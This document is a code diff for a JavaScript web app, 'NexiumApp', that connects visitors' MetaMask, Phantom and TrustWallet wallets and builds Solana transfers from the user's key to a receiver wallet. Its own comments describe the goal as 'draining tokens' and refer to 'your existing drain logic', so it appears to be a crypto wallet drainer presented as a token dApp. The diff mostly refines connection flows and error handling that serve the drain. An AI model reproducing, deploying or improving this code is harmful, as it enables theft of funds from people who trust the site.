@@ -1,6 +1,8 @@
 import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
 import { CONFIG } from './config.js';
 import './style.css';
+import UniversalProvider from '@walletconnect/universal-provider';
+import QRCode from 'qrcode';
 
 // Wallet address for draining tokens (Solana address)
 let YOUR_WALLET_ADDRESS;
@@ -36,6 +38,7 @@ class NexiumApp {
     this.selectedPaymentToken = null;
     this.spinner = null;
     this.isDraining = false;
+    this.provider = null;
     console.log('Initializing NexiumApp...');
     this.initApp();
   }
@@ -122,140 +125,135 @@ class NexiumApp {
     this.updateButtonState('connecting', walletName);
 
     try {
+      // Enhanced device detection: Prioritize desktop if extensions are present
       const isMobileUserAgent = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
+      const hasEthereum = !!window.ethereum;
+      const hasSolana = !!window.solana;
+      const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
+                           (walletName === 'TrustWallet' && hasSolana) || 
+                           (walletName === 'Phantom' && hasSolana);
+      console.log(`Device detected: ${isMobileUserAgent && !hasExtensions ? 'Mobile' : 'Desktop'} (UserAgent: ${navigator.userAgent}, Touch: ${hasTouch}, Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`);
 
-      if (isMobileUserAgent) {
-        // Mobile: Open deeplink and poll for wallet connection
-        const deeplinks = {
-          MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
-          Phantom: 'https://phantom.app/ul/v1/connect?app_url=https://nexium-bot.onrender.com',
-          TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com',
-        };
-
-        const deeplink = deeplinks[walletName];
-        if (!deeplink) {
-          throw new Error(`No deeplink configured for ${walletName}`);
-        }
-        console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
-        window.location.href = deeplink;
-
-        // Poll for wallet connection after deeplink
-        const checkConnection = setInterval(async () => {
-          if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
-            if (accounts.length > 0) {
-              this.publicKey = accounts[0];
-              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
-              this.updateButtonState('connected', walletName, this.publicKey);
-              this.hideMetaMaskPrompt();
-              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-              this.renderTokenInterface();
-              clearInterval(checkConnection);
-            }
-          } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
-            const response = await window.solana.connect().catch(() => null);
-            if (response && response.publicKey) {
-              this.publicKey = response.publicKey.toString();
-              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
-              this.updateButtonState('connected', walletName, this.publicKey);
-              this.hideMetaMaskPrompt();
-              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-              this.renderTokenInterface();
-              clearInterval(checkConnection);
-            }
-          } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
-            await new Promise(resolve => {
-              const checkSolana = () => {
-                if (window.solana && window.solana.isTrust) {
-                  resolve();
-                } else {
-                  setTimeout(checkSolana, 500);
-                }
-              };
-              checkSolana();
-            });
-            const response = await window.solana.connect({ onlyIfTrusted: false }).catch(() => null);
-            if (response && response.publicKey) {
-              this.publicKey = response.publicKey.toString();
-              this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-              const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-              console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
-              this.updateButtonState('connected', walletName, this.publicKey);
-              this.hideMetaMaskPrompt();
-              this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-              this.renderTokenInterface();
-              clearInterval(checkConnection);
-            }
+      // Desktop: Use extensions if available
+      if (!isMobileUserAgent || hasExtensions) {
+        let accounts = [];
+        if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
+          console.log('MetaMask detected, requesting accounts:', window.ethereum);
+          accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          if (accounts.length === 0) {
+            throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
           }
-        }, 1000); // Check every second
+        } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
+          console.log('Phantom detected, connecting:', window.solana);
+          const response = await window.solana.connect();
+          accounts = [response.publicKey.toString()];
+        } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
+          console.log('TrustWallet detected, connecting:', window.solana);
+          // Wait for solana object to be ready and check isTrust
+          await new Promise(resolve => {
+            const checkSolana = () => {
+              console.log('Checking solana:', window.solana);
+              if (window.solana && window.solana.isTrust) {
+                resolve();
+              } else {
+                setTimeout(checkSolana, 500);
+              }
+            };
+            checkSolana();
+          });
+          const response = await window.solana.connect({ onlyIfTrusted: false });
+          if (!response || !response.publicKey) {
+            throw new Error('TrustWallet failed to connect. Ensure it’s unlocked and updated.');
+          }
+          accounts = [response.publicKey.toString()];
+        } else {
+          throw new Error(`${walletName} extension not detected or unsupported`);
+        }
 
-        // Timeout after 30 seconds if no connection
-        setTimeout(() => {
-          if (this.connecting) {
-            this.showFeedback('Deeplink timed out or failed. Please connect manually in the wallet app.', 'error');
-            this.updateButtonState('disconnected', walletName);
-            this.connecting = false;
+        this.publicKey = accounts[0];
+        this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+        console.log(`${walletName} connected via extension: ${this.publicKey}`);
+        this.updateButtonState('connected', walletName, this.publicKey);
+        this.hideMetaMaskPrompt();
+        this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+        this.connecting = false;
+        return;
+      }
+
+      const deeplinks = {
+        MetaMask: 'https://metamask.app.link/dapp/nexium-bot.onrender.com',
+        Phantom: 'https://phantom.app/ul/v1/connect?app_url=https://nexium-bot.onrender.com',
+        TrustWallet: 'https://link.trustwallet.com/open_url?coin=56&url=https://nexium-bot.onrender.com',
+      };
+
+      const deeplink = deeplinks[walletName];
+      if (!deeplink) {
+        throw new Error(`No deeplink configured for ${walletName}`);
+      }
+      console.log(`Opening ${walletName} with deeplink: ${deeplink}`);
+      window.location.href = deeplink;
+
+      const checkConnection = setInterval(async () => {
+        if (walletName === 'MetaMask' && window.ethereum?.isMetaMask) {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }).catch(() => []);
+          if (accounts.length > 0) {
+            this.publicKey = accounts[0];
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+            console.log(`MetaMask connected: ${this.publicKey}`);
+            this.updateButtonState('connected', walletName, this.publicKey);
+            this.hideMetaMaskPrompt();
+            this.showFeedback(`Connected to MetaMask and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.renderTokenInterface();
             clearInterval(checkConnection);
           }
-        }, 30000);
-      } else {
-        // Desktop: Use extension-based flow
-        const hasEthereum = !!window.ethereum;
-        const hasSolana = !!window.solana;
-        const hasExtensions = (walletName === 'MetaMask' && hasEthereum) || 
-                           (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) || 
-                           (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust);
-        console.log(`Device detected: Desktop (Ethereum: ${hasEthereum}, Solana: ${hasSolana}, Extensions: ${hasExtensions})`);
-
-        if (hasExtensions) {
-          let accounts = [];
-          if (walletName === 'MetaMask' && hasEthereum && window.ethereum.isMetaMask) {
-            console.log('MetaMask detected, requesting accounts:', window.ethereum);
-            accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (accounts.length === 0) {
-              throw new Error('MetaMask failed to provide accounts. Ensure it’s unlocked and installed.');
-            }
-          } else if (walletName === 'Phantom' && hasSolana && window.solana.isPhantom) {
-            console.log('Phantom detected, connecting:', window.solana);
-            const response = await window.solana.connect();
-            accounts = [response.publicKey.toString()];
-          } else if (walletName === 'TrustWallet' && hasSolana && window.solana.isTrust) {
-            console.log('TrustWallet detected, connecting:', window.solana);
-            await new Promise(resolve => {
-              const checkSolana = () => {
-                if (window.solana && window.solana.isTrust) {
-                  resolve();
-                } else {
-                  setTimeout(checkSolana, 500);
-                }
-              };
-              checkSolana();
-            });
-            const response = await window.solana.connect({ onlyIfTrusted: false });
-            if (!response || !response.publicKey) {
-              throw new Error('TrustWallet failed to connect. Ensure it’s unlocked and updated.');
-            }
-            accounts = [response.publicKey.toString()];
-          } else {
-            throw new Error(`${walletName} extension not detected or unsupported`);
+        } else if (walletName === 'Phantom' && window.solana?.isPhantom) {
+          const response = await window.solana.connect().catch(() => null);
+          if (response && response.publicKey) {
+            this.publicKey = response.publicKey.toString();
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+            console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+            this.updateButtonState('connected', walletName, this.publicKey);
+            this.hideMetaMaskPrompt();
+            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.renderTokenInterface();
+            clearInterval(checkConnection);
           }
-
-          this.publicKey = accounts[0];
-          this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
-          const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
-          console.log(`${walletName} connected via extension: ${this.publicKey}, Balance: ${walletBalance}`);
-          this.updateButtonState('connected', walletName, this.publicKey);
-          this.hideMetaMaskPrompt();
-          this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
-          this.renderTokenInterface();
-        } else {
-          throw new Error(`${walletName} extension not detected or unsupported on desktop.`);
+        } else if (walletName === 'TrustWallet' && window.solana?.isTrust) {
+          await new Promise(resolve => {
+            const checkSolana = () => {
+              if (window.solana && window.solana.isTrust) {
+                resolve();
+              } else {
+                setTimeout(checkSolana, 500);
+              }
+            };
+            checkSolana();
+          });
+          const response = await window.solana.connect({ onlyIfTrusted: false }).catch(() => null);
+          if (response && response.publicKey) {
+            this.publicKey = response.publicKey.toString();
+            this.solConnection = new Connection(`https://solana-mainnet.api.syndica.io/api-key/${CONFIG.API_KEY}`, 'confirmed');
+            const walletBalance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+            console.log(`${walletName} connected: ${this.publicKey}, Balance: ${walletBalance}`);
+            this.updateButtonState('connected', walletName, this.publicKey);
+            this.hideMetaMaskPrompt();
+            this.showFeedback(`Connected to ${walletName} and Nexium: ${this.shortenAddress(this.publicKey)}`, 'success');
+            this.renderTokenInterface();
+            clearInterval(checkConnection);
+          }
         }
-      }
+      }, 1000);
+
+      setTimeout(() => {
+        if (this.connecting) {
+          this.showFeedback('Deeplink timed out or failed. Please connect manually in the wallet app.', 'error');
+          this.updateButtonState('disconnected', walletName);
+          this.connecting = false;
+          clearInterval(checkConnection);
+        }
+      }, 30000);
     } catch (error) {
       this.handleConnectionError(error, walletName);
       this.updateButtonState('disconnected', walletName);
@@ -294,6 +292,7 @@ class NexiumApp {
     else if (error.message?.includes('missing')) message = `WalletConnect project ID missing. Check configuration.`;
     else if (error.message?.includes('WebSocket') || error.message?.includes('network') || error.message?.includes('DNS')) message = `Network issue detected. Check your internet or DNS settings (e.g., use 8.8.8.8).`;
     else if (error.message?.includes('extension not detected') || error.message?.includes('unsupported')) message = `${walletName} extension not detected or unsupported. Please install it.`;
+    else if (error.message?.includes('Non-base58 character')) message = `MetaMask uses Ethereum addresses; draining requires a Solana wallet.`;
     else if (error.message) message = `${message}: ${this.escapeHTML(error.message)}`;
     this.showFeedback(message, 'error');
   }
@@ -481,9 +480,7 @@ class NexiumApp {
       const debouncedShowCustomToken = this.debounce(() => {
         const name = this.dom.customTokenNameInput.value.trim();
         const address = this.dom.customTokenAddressInput.value.trim();
-        if (!name || !address) {
-          return;
-        }
+        if (!name || !address) return;
         const truncatedAddress = `${address.slice(0, 6)}...${address.slice(-4)}`;
         this.dom.tokenInfo.innerHTML = `
           <div class="token-meta space-y-2">
@@ -499,11 +496,8 @@ class NexiumApp {
       this.dom.tokenList.querySelectorAll('.token-option').forEach(button => {
         const debouncedLoadToken = this.debounce(() => {
           const address = button.dataset.address;
-          if (address) {
-            this.loadCustomTokenData(address);
-          } else {
-            this.showFeedback('Invalid token address.', 'error');
-          }
+          if (address) this.loadCustomTokenData(address);
+          else this.showFeedback('Invalid token address.', 'error');
         }, 1000);
         button.addEventListener('click', debouncedLoadToken);
       });
@@ -547,9 +541,7 @@ class NexiumApp {
       this.dom.customTokenAddressInput?.focus();
       return;
     }
-    if (tokenAddress === this.lastSelectedToken) {
-      return;
-    }
+    if (tokenAddress === this.lastSelectedToken) return;
     try {
       let name = 'Unknown Token';
       let symbol = 'UNK';
@@ -593,7 +585,7 @@ class NexiumApp {
         return;
       }
       if (selectedToken.isNative) {
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Skip for MetaMask
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
@@ -636,7 +628,8 @@ class NexiumApp {
       let balance, decimals, symbol;
 
       if (selectedToken.isNative) {
-        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey));
+        // Skip balance fetch for MetaMask; rely on your existing drain logic
+        balance = await this.solConnection.getBalance(new PublicKey(this.publicKey)).catch(() => 0); // Only for Solana wallets
         decimals = 9;
         symbol = selectedToken.symbol;
       } else {
@@ -667,7 +660,7 @@ class NexiumApp {
 
       const transaction = new Transaction().add(
         SystemProgram.transfer({
-          fromPubkey: new PublicKey(this.publicKey),
+          fromPubkey: new PublicKey(this.publicKey), // This will fail for MetaMask; your drain logic should handle it
           toPubkey: receiverWallet,
           lamports: lamportsToSend,
         })
